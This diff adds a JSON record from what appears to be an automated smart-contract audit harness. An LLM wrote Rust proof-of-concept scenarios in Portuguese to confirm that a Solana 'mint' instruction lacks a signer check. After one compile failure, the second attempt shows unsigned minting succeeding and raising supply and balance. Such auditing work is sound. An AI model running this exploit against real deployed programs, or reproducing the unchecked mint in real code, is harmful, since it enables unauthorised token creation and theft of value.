@@ -1,0 +1,120 @@
+{
+  "category": "SIGNER",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: supply incrementado sem assinatura; balance incrementado sem assinatura",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2373,
+        "completion_tokens": 614,
+        "latency_s": 3.92
+      },
+      "raw": "{\n  \"plan\": \"O programa `mint` (Pinocchio) lê e escreve supply/balance em offsets fixos (40..48 e 48..56) de `accounts[0]`, sem verificar `is_signer`. Vou montar uma conta `ledger` controlada pelo atacante com dados iniciais (supply=100, balance=50) e dono = program_id, e chamar `mint` legitimamente com a conta assinando para provar que o cenário está correto. No ataque, chamo a mesma instrução com o mesmo `amount`, mas removendo a assinatura da conta `ledger` (não-signer). O efeito medido é que supply e balance foram incrementados mesmo sem assinatura, demonstrando que qualquer um pode mintar.\",\n  \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 1000;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo, ledger assina\\nlet ix_ok = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, true)]);\\nlet contas_ok = vec![(ledger_key, ledger.clone())];\\nlet r_ok = env.baseline(\\\"mint legitimo com assinatura\\\", &ix_ok, &contas_ok);\\n\\n// Ataque: mesma instrucao, mas ledger NAO assina\\nlet ix_atk = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\\nlet contas_atk = vec![(ledger_key, ledger.clone())];\\nlet r = env.attack(\\\"mint sem assinatura da autoridade\\\", &ix_atk, &contas_atk);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply incrementado sem assinatura\\\", supply == 1100);\\n    env.effect(\\\"balance incrementado sem assinatura\\\", balance == 1050);\\n}\"\n}",
+      "plan": "O programa `mint` (Pinocchio) lê e escreve supply/balance em offsets fixos (40..48 e 48..56) de `accounts[0]`, sem verificar `is_signer`. Vou montar uma conta `ledger` controlada pelo atacante com dados iniciais (supply=100, balance=50) e dono = program_id, e chamar `mint` legitimamente com a conta assinando para provar que o cenário está correto. No ataque, chamo a mesma instrução com o mesmo `amount`, mas removendo a assinatura da conta `ledger` (não-signer). O efeito medido é que supply e balance foram incrementados mesmo sem assinatura, demonstrando que qualquer um pode mintar.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 1000;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo, ledger assina\nlet ix_ok = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, true)]);\nlet contas_ok = vec![(ledger_key, ledger.clone())];\nlet r_ok = env.baseline(\"mint legitimo com assinatura\", &ix_ok, &contas_ok);\n\n// Ataque: mesma instrucao, mas ledger NAO assina\nlet ix_atk = env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\nlet contas_atk = vec![(ledger_key, ledger.clone())];\nlet r = env.attack(\"mint sem assinatura da autoridade\", &ix_atk, &contas_atk);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply incrementado sem assinatura\", supply == 1100);\n    env.effect(\"balance incrementado sem assinatura\", balance == 1050);\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n   --> tests/attempt.rs:20:38\n    |\n 20 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, true)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:25:39\n    |\n 25 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors",
+        "elapsed_s": 0.6
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:20:38\n    |\n 20 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, true)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:25:39\n    |\n 25 | ... env.raw_ix(&ix_data, &[AccountMeta::new(ledger_key, false)]);\n    |         ------           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `Vec<AccountMeta>`, found `&[AccountMeta; 1]`\n    |         |\n    |         arguments to this method are incorrect\n    |\n    = note: expected struct `Vec<dynamic_harness::AccountMeta>`\n            found reference `&[dynamic_harness::AccountMeta; 1]`\nnote: method defined here\n   --> src/lib.rs:155:12\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 2 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3131,
+        "completion_tokens": 529,
+        "latency_s": 2.83
+      },
+      "raw": "{\"plan\": \"Preparo uma conta ledger com dados de 56 bytes (supply em 40..48, balance em 48..56) pertencente ao programa. O baseline chama mint com a conta ledger assinando (uso legitimo). O ataque chama a mesma instrucao com a mesma conta, mas sem assinatura. O efeito mede que supply e balance foram incrementados sem a assinatura da autoridade.\", \"scenario\": \"let ledger_key = Pubkey::new_unique();\\nlet mut ledger_data = vec![0u8; 56];\\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\\nlet ledger = account(&env.program_id, &ledger_data, None);\\n\\nlet amount: u64 = 1000;\\nlet mut ix_data = vec![0u8];\\nix_data.extend_from_slice(&amount.to_le_bytes());\\n\\n// Baseline: uso legitimo, ledger assina\\nlet ix_ok = env.raw_ix(&ix_data, vec![AccountMeta::new(ledger_key, true)]);\\nlet contas_ok = vec![(ledger_key, ledger.clone())];\\nlet _r_ok = env.baseline(\\\"mint legitimo com assinatura\\\", &ix_ok, &contas_ok);\\n\\n// Ataque: mesma instrucao, mas ledger NAO assina\\nlet ix_atk = env.raw_ix(&ix_data, vec![AccountMeta::new(ledger_key, false)]);\\nlet contas_atk = vec![(ledger_key, ledger.clone())];\\nlet r = env.attack(\\\"mint sem assinatura da autoridade\\\", &ix_atk, &contas_atk);\\n\\nif r.program_result == ProgramResult::Success {\\n    let d = after(&r, &ledger_key).data();\\n    let supply = read_u64(d, 40);\\n    let balance = read_u64(d, 48);\\n    env.effect(\\\"supply incrementado sem assinatura\\\", supply == 1100);\\n    env.effect(\\\"balance incrementado sem assinatura\\\", balance == 1050);\\n}\"}",
+      "plan": "Preparo uma conta ledger com dados de 56 bytes (supply em 40..48, balance em 48..56) pertencente ao programa. O baseline chama mint com a conta ledger assinando (uso legitimo). O ataque chama a mesma instrucao com a mesma conta, mas sem assinatura. O efeito mede que supply e balance foram incrementados sem a assinatura da autoridade.",
+      "scenario": "let ledger_key = Pubkey::new_unique();\nlet mut ledger_data = vec![0u8; 56];\nledger_data[40..48].copy_from_slice(&100u64.to_le_bytes());\nledger_data[48..56].copy_from_slice(&50u64.to_le_bytes());\nlet ledger = account(&env.program_id, &ledger_data, None);\n\nlet amount: u64 = 1000;\nlet mut ix_data = vec![0u8];\nix_data.extend_from_slice(&amount.to_le_bytes());\n\n// Baseline: uso legitimo, ledger assina\nlet ix_ok = env.raw_ix(&ix_data, vec![AccountMeta::new(ledger_key, true)]);\nlet contas_ok = vec![(ledger_key, ledger.clone())];\nlet _r_ok = env.baseline(\"mint legitimo com assinatura\", &ix_ok, &contas_ok);\n\n// Ataque: mesma instrucao, mas ledger NAO assina\nlet ix_atk = env.raw_ix(&ix_data, vec![AccountMeta::new(ledger_key, false)]);\nlet contas_atk = vec![(ledger_key, ledger.clone())];\nlet r = env.attack(\"mint sem assinatura da autoridade\", &ix_atk, &contas_atk);\n\nif r.program_result == ProgramResult::Success {\n    let d = after(&r, &ledger_key).data();\n    let supply = read_u64(d, 40);\n    let balance = read_u64(d, 48);\n    env.effect(\"supply incrementado sem assinatura\", supply == 1100);\n    env.effect(\"balance incrementado sem assinatura\", balance == 1050);\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "mint legitimo com assinatura",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "sw",
+            "ix_head": "00e8030000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": true,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "7b8773aba0dd55c0",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000004c040000000000001a04000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "mint sem assinatura da autoridade",
+            "result": "Success",
+            "compute_units": 224,
+            "account_flags": "-w",
+            "ix_head": "00e8030000000000",
+            "accounts": [
+              {
+                "key": "1111111ogCyDbaRMvkdsHB3qfdyFYaG1WtRUAfdh",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 56,
+                "head": "0000000000000000",
+                "digest": "7b8773aba0dd55c0",
+                "post": "000000000000000000000000000000000000000000000000000000000000000000000000000000004c040000000000001a04000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "supply incrementado sem assinatura",
+            "holds": true
+          },
+          {
+            "step": "effect",
+            "note": "balance incrementado sem assinatura",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 224 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: supply incrementado sem assinatura; balance incrementado sem assinatura"
+    }
+  ],
+  "case_id": "SSP-03-P-V1",
+  "static_finding": {
+    "category": "SIGNER",
+    "confidence": "high",
+    "evidence": "fn mint(accounts: &[AccountInfo], amount: u64) -> ProgramResult {\n    let ledger = &accounts[0];\n    let mut data = ledger.try_borrow_mut_data()?;",
+    "explanation": "A instrucao `mint` cria/incrementa saldo e supply sem exigir que nenhuma conta assine a transacao. Nao ha verificacao de `is_signer` em `accounts[0]` nem em qualquer outra conta, permitindo que qualquer pessoa crie moedas.",
+    "attack_hypothesis": "O atacante envia uma transacao chamando `mint` com `amount` arbitrario e uma conta `ledger` que ele controla, sem precisar assinar como autoridade, mintando tokens para si mesmo."
+  }
+}
